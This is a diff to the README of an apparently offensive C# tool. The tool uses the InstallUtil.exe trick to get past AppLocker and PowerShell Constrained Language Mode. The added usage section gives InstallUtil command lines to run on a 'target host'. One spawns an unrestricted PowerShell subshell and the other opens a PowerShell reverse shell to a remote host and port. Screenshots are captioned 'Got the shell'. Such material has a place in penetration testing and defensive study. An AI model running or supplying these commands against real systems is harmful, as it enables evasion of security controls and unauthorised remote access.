@@ -18,16 +18,46 @@ With AppLocker in Allow mode and PowerShell running in Constrained Mode, it is n
 to change the PowerShell language mode to full in order to run attack tools." [[Source]](https://adsecurity.org/?p=2604)
  
 ## Build the binary
-The project is written in C#. All the source (few lines of codes though) is committed: .csproj, .sln ...
+The project is written in C#. All the source (few lines of codes though) is committed: .csproj, .sln ...  
 You should be able to easily compile and build the binary with the default configuration Debug/X64.
 
 ## Usage
 Well, nothing new here as we're going to use the old and well-known trick of "InstallUtil.exe" to bypass execution of exe.
-Once you've compiled the binary, issue the below command on the target host.
+Once you've compiled the binary, issue the below command on the target host.  
+Besides, your binary doesn't have to be an "exe" as InstallUtil.exe parse any file type (.txt, .bin....)
 
+This one opens a subshell in the current console
+```bash
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
+```
+
+This one tries to open a PS reverse shell (I've bound it into the source as a life saver :-) ..)
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
 ```
+
+## Testing
+
+![Screenshot](img/clm01.JPG?raw=true)
+
+![Screenshot](img/clm02.JPG?raw=true)
+
+PS in process in current console
+![Screenshot](img/clm03.JPG?raw=true)
+
+Teying to open PS reverse shell
+![Screenshot](img/clm04.JPG?raw=true)
+
+Got the shell
+![Screenshot](img/clm05.JPG?raw=true)
+
+
+## Useful Links
+https://blogs.msdn.microsoft.com/powershell/2017/11/02/powershell-constrained-language-mode/
+https://adsecurity.org/?p=2604
+https://pentestn00b.wordpress.com/2017/03/20/simple-bypass-for-powershell-constrained-language-mode/
+https://blog.stealthbits.com/how-attackers-are-bypassing-powershell-protections/
+https://decoder.cloud/2017/11/17/we-dont-need-powershell-exe-part-3/
 
 
 ## Author
